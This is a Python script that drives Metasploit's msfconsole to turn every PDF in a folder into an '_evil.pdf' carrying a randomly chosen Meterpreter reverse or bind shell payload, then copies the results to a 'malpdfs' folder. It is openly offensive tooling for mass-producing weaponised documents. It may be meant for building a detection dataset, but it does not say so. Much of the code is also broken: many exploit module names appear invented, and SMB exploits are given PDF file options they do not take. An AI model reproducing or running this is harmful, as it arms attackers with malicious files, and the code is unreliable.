import os
import subprocess
import random

# Directory containing PDF files
pdf_directory = "./cleanpdfs"

# Exploit commands list
exploit_commands = [
    "use exploit/windows/smb/ms08_067_netapi",
    "use exploit/windows/browser/ms10_002_aurora",
    "use exploit/windows/http/jboss_invoke_deploy",
    "use exploit/windows/smb/ms17_010_eternalblue",
    "use exploit/windows/smb/ms17_010_psexec",
    "use exploit/windows/smb/smb_delivery",
    "use exploit/windows/smb/smb_doublepulsar_rce",
    "use exploit/windows/smb/smb_relay",
    "use exploit/windows/smb/smb_relay_login",
    "use exploit/windows/smb/smb_relay_logout",
    "use exploit/windows/smb/smb_relay_session_setup",
    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv1",
    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2",
    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_domain",
    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_hash",
    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_user",
    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_user_domain",
    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_user_domain_hash",
    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_user_hash",
    "use exploit/windows/smb/smb_relay_session_setup_with_ntlmv2_user_hash_domain",
    # Add more exploit commands here
]

# Payload commands list
payload_commands = [
    "set payload windows/meterpreter/reverse_tcp",
    "set payload windows/x64/meterpreter/reverse_tcp",
    "set payload windows/meterpreter/reverse_http",
    "set payload windows/x64/meterpreter/reverse_http",
    "set payload windows/meterpreter/reverse_https",
    "set payload windows/x64/meterpreter/reverse_https",
    "set payload windows/meterpreter/bind_tcp",
    "set payload windows/x64/meterpreter/bind_tcp",
    "set payload windows/meterpreter/bind_ipv6_tcp",
    "set payload windows/x64/meterpreter/bind_ipv6_tcp",
    "set payload windows/meterpreter/bind_nonx_tcp",
    "set payload windows/x64/meterpreter/bind_nonx_tcp",
    "set payload windows/meterpreter/bind_tcp_uuid",
    "set payload windows/x64/meterpreter/bind_tcp_uuid",
    "set payload windows/meterpreter/bind_ipv6_tcp_uuid",
    "set payload windows/x64/meterpreter/bind_ipv6_tcp_uuid",
    "set payload windows/meterpreter/reverse_tcp_uuid",
    "set payload windows/x64/meterpreter/reverse_tcp_uuid",
    "set payload windows/meterpreter/reverse_http_uuid",
    # Add more payload commands here
]

# Randomly select an exploit and payload command
selected_exploit = random.choice(exploit_commands)
selected_payload = random.choice(payload_commands)

# Metasploit commands
msf_commands = [
    selected_exploit,
    selected_payload,
    "exploit",
]

# Open msfconsole
process = subprocess.Popen(["sudo", "msfconsole"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

# Send Metasploit commands
for command in msf_commands:
    process.stdin.write(command + "\n")
    process.stdin.flush()

# Iterate over PDF files in the directory
for pdf_file in os.listdir(pdf_directory):
    if pdf_file.endswith(".pdf"):
        # Set the original name without extension
        original_name = os.path.splitext(pdf_file)[0]

        # Set FILENAME and INFILENAME in Metasploit
        set_filename_command = f"set FILENAME {original_name}_evil.pdf"
        set_infilename_command = f"set INFILENAME {os.path.join(pdf_directory, pdf_file)}"

        process.stdin.write(set_filename_command + "\n")
        process.stdin.write(set_infilename_command + "\n")
        process.stdin.write("exploit\n")
        process.stdin.flush()

        print(f"Exploited {pdf_file}")

# Exit msfconsole
process.stdin.write("exit\n")
process.stdin.flush()

# Wait for the process to complete
output, error = process.communicate()

# Print the output and error messages
print("Output:", output)
print("Error:", error)

# Move files to malpdfs directory
move_command = "sudo sh -c 'cp /root/.msf4/local/* $(pwd)/malpdfs/'"
subprocess.run(move_command, shell=True)

# Delete content from /root/.msf4/local/
delete_command = "sudo rm -r /root/.msf4/local/*"
subprocess.run(delete_command, shell=True)

print("Files moved to malpdfs and /root/.msf4/local/ content deleted.")

